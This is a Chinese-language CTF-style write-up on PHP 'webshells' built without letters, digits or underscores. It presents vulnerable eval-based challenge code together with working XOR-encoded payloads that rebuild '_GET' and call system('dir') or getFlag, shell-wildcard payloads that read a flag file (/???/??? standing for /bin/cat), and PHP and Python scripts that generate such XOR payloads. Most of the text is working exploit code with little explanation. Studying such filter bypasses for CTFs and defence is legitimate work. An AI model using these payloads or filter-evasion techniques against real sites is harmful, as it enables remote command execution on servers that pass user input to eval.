# PHP无数字、字母等特殊webshell
## 无数字、字母
```php
<?php
highlight_file(__FILE__);
include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(strlen($code)>40){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    @eval($code);
}
// $hint = "php function getFlag() to get flag";
?>
// payload
/*
?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=getFlag
?code=${"!"^"~"}="]%];,<<"^":@)}@][";${"!"^"~"}();
test.php?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=system&__=dir
$_="`{{{"^"?<>/";       ------------>  $_=_GET
${$_}[_](${$_}[__]);    ------------>  ${_GET}[_](${_GET[__])
${_GET}[_](${_GET[__])  ------------>  system('dir');
*/
```
```php
// fuzz脚本
<?php
$test = '_GET';
$a = str_split($test);
$set = array();
for ($i = 0; $i < 256; $i++) {
    $ch = '{' ^ chr($i);
    if (in_array($ch, $a, true)) {
        echo "{^chr(" . $i . ")=".$ch."\n";
        $set[$ch] = 'chr(' . $i . ')';
    }
}
var_dump($set);
$res = '';
for ($i = 0; $i < strlen($test); $i++) {
    $res .= '{';
}
$res .= '^';
foreach ($a as $k => $v) {
    $res .= $set[$v] . '.';
}
echo $res;
```
```python
#!/usr/bin/python
#coding=utf-8

def getNoshell(keyword=""):
    noPrint = []
    noAllow = []
    for i in range(1, 48):
        if i not in noAllow:
            noPrint.append(i)
    for i in range(58, 65):
        if i not in noAllow:
            noPrint.append(i)
    for i in range(91, 97):
        if i not in noAllow:
            noPrint.append(i)
    for i in range(123, 128):
        if i not in noAllow:
            noPrint.append(i)
    result = {}
    for k in keyword:
        result[k] = {}
        result[k]['l'] = []
        result[k]['r'] = []
        for i in range(0,len(noPrint)):
            for j in noPrint[i:]:
                if chr(noPrint[i] ^ j) == k:
                    result[k]['l'].append('chr(' + str(noPrint[i]) + ')')
                    result[k]['r'].append('chr(' + str(j) + ')')
    letn = 999999
    for k in result:
        if letn > len(result[k]['l']):
            letn = len(result[k]['l'])
    for m in range(0,letn):
        testl = ''
        testr = ''
        for k in keyword:
            testl = testl + result[k]['l'][m] + "."
            testr = testr + result[k]['r'][m] + "."
        print testl[0:-1] + "^" + testr[0:-1]
getNoshell("getFlag")
```
利用通配符调用Linux系统命令，来查看flag ：
```sh
$_=`/???/??? /????`;?><?=$_?>
实际上等价于：
$_=`/bin/cat /FLAG`;?><?=$_?>
其中=$_?>等价于 echo $_?>
或者
?><?=`/???/???%20./????.???`?> 
```
## 无数字、字母、下划线
```php
<?php
highlight_file(__FILE__);
include 'flag.php';
if (isset($_GET['code'])) {
    $code = $_GET['code'];
    if (strlen($code) > 50) {
        die("Too Long.");
    }
    if (preg_match("/[A-Za-z0-9_]+/", $code)) {
        die("Not Allowed.");
    }
    @eval($code);
}
//$hint = "php function getFlag() to get flag";
?>
```
这道题目实际上和上面那道题目差不多，只是过滤了一个下划线 _ 而已，我们可以用中文来做变量名：
```php
$中="`{{{"^"?<>/";${$中}[国](${$中}[强]);&国=system&强=dir
```